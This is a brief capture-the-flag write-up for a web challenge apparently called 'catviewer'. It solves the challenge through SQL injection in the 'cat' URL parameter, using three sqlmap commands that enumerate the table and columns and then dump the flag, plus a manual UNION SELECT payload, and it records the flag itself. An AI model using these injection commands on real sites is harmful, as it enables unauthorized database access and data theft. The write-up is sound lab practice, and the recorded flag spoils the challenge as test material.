https://nessus-catviewer.chals.io/index.php?cat=Shelton

this is an sql injection.

> sqlmap -u "https://nessus-catviewer.chals.io/index.php?cat=Shelton%20Gay" --dump

+-----+------+
| seq | name |
+-----+------+
| 195 | cats |
+-----+------+

> sqlmap -u "https://nessus-catviewer.chals.io/index.php?cat=Shelton%20Gay" -T cats --columns

+--------+---------+
| Column | Type    |
+--------+---------+
| flag   | TEXT    |
| id     | INTEGER |
| image  | TEXT    |
| name   | TEXT    |
+--------+---------+

> sqlmap -u "https://nessus-catviewer.chals.io/index.php?cat=Shelton%20Gay" -T cats -C flag --dump

flag{a_sea_of_cats}



OR

" UNION SELECT 1,2,flag,4 from cats -- -

flag{a_sea_of_cats}
